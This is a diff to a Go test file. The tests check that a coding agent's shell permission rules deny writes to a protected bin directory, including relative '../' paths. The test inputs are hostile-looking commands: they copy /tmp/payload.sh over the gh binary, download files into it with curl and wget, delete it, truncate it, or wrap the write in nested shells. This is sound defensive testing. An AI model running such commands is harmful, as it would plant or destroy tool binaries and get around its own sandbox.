@@ -432,7 +432,7 @@ func TestOpenCodeBashScopedEntry(t *testing.T) {
 	// entries must be the LAST entries the pattern map marshals, so nothing
 	// added earlier (a scoped allow) can be reordered ahead of them by
 	// encoding/json's usual key-sort.
-	raw2, err := json.Marshal(openCodeShellPermission(&openCodeToolGrant{scopes: []string{"git *"}}, ""))
+	raw2, err := json.Marshal(openCodeShellPermission(&openCodeToolGrant{scopes: []string{"git *"}}, "", ""))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -1158,6 +1158,20 @@ func TestOpenCodeShellPermissionDeniesBinDirWrites(t *testing.T) {
 					"install -m 0755 /tmp/payload.sh " + gh,
 					"tee " + gh,
 					"rsync -a /tmp/payload.sh " + gh,
+					fmt.Sprintf(`sh -c "cp /tmp/payload.sh %s"`, gh),
+					fmt.Sprintf(`bash -lc 'mv /tmp/payload.sh %s'`, gh),
+					"echo x > " + gh,
+					"printf x >> " + gh,
+					"cat /tmp/payload.sh 2> " + gh,
+					"true && cp /tmp/payload.sh " + gh,
+					"dd if=/tmp/payload.sh of=" + gh,
+					"curl -o " + gh + " https://example.invalid/x",
+					"rm " + gh,
+					"wget -O " + gh + " https://example.invalid/x",
+					"unlink " + gh,
+					"truncate -s0 " + gh,
+					"chmod +x " + gh,
+					"cat /tmp/payload.sh &> " + gh,
 				} {
 					if got := openCodePatternAction(pm, cmd); got != openCodeDeny {
 						t.Errorf("%s, %s: shell %q resolves to %q, want %q", c.name, grantName, cmd, got, openCodeDeny)
@@ -1170,6 +1184,10 @@ func TestOpenCodeShellPermissionDeniesBinDirWrites(t *testing.T) {
 					gh + " pr view 1",
 					fmt.Sprintf("%q pr view 1", gh),
 					fmt.Sprintf("PATH=%q:$PATH nightgauge doctor", dir),
+					`"$BIN" doctor > /tmp/out`,
+					gh + " layout path plans 2>/dev/null",
+					"cat " + filepath.Join(dir, "README"),
+					"git add . && " + gh + " pr create",
 				} {
 					if got := openCodePatternAction(pm, cmd); got == openCodeDeny {
 						t.Errorf("%s, %s: shell %q resolves to deny; running a binary from the bin dir must stay allowed", c.name, grantName, cmd)
@@ -1178,7 +1196,48 @@ func TestOpenCodeShellPermissionDeniesBinDirWrites(t *testing.T) {
 			}
 		}
 	}
-	if pats := openCodeShellBinDirDenyPatterns(""); pats != nil {
+	if pats := openCodeShellBinDirDenyPatterns("", ""); pats != nil {
 		t.Errorf("no bin dir: patterns = %q, want none", pats)
+	}
+}
+
+// TestOpenCodeShellPermissionDeniesRelativeBinDirWrites: a bin dir outside the
+// worktree is denied by its worktree-relative `../` path too (#3615), and a bin
+// dir inside the worktree emits no bare relative pattern.
+func TestOpenCodeShellPermissionDeniesRelativeBinDirWrites(t *testing.T) {
+	parent := t.TempDir()
+	wt := filepath.Join(parent, "wt", "repo")
+	bin := filepath.Join(parent, "tools", "bin")
+	for _, d := range []string{wt, bin} {
+		if err := os.MkdirAll(d, 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := os.WriteFile(filepath.Join(wt, ".git"), []byte("gitdir: x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	pm := openCodePermissionMap(RunOptions{AllowedTools: []string{"Bash"}, WorktreeDir: wt}, bin).Shell
+	for _, cmd := range []string{
+		"cp /tmp/payload.sh ../../tools/bin/gh",
+		"cp /tmp/payload.sh ./../../tools/bin/gh",
+		"echo x > ../../tools/bin/gh",
+	} {
+		if got := openCodePatternAction(pm, cmd); got != openCodeDeny {
+			t.Errorf("shell %q resolves to %q, want %q", cmd, got, openCodeDeny)
+		}
+	}
+	if got := openCodePatternAction(pm, "cp a ../other/gh"); got == openCodeDeny {
+		t.Errorf("unrelated relative write resolves to deny")
+	}
+
+	inside := filepath.Join(wt, "bin")
+	for _, p := range openCodeShellBinDirDenyPatterns(inside, wt) {
+		if strings.Contains(p, " *bin*") || p == "*>*bin*" {
+			t.Errorf("inside-worktree bin dir emitted bare relative pattern %q", p)
+		}
+	}
+	pm = openCodePermissionMap(RunOptions{AllowedTools: []string{"Bash"}, WorktreeDir: wt}, inside).Shell
+	if got := openCodePatternAction(pm, "cp a build/bin-out"); got == openCodeDeny {
+		t.Errorf("inside-worktree bin dir denies unrelated write")
 	}
 }
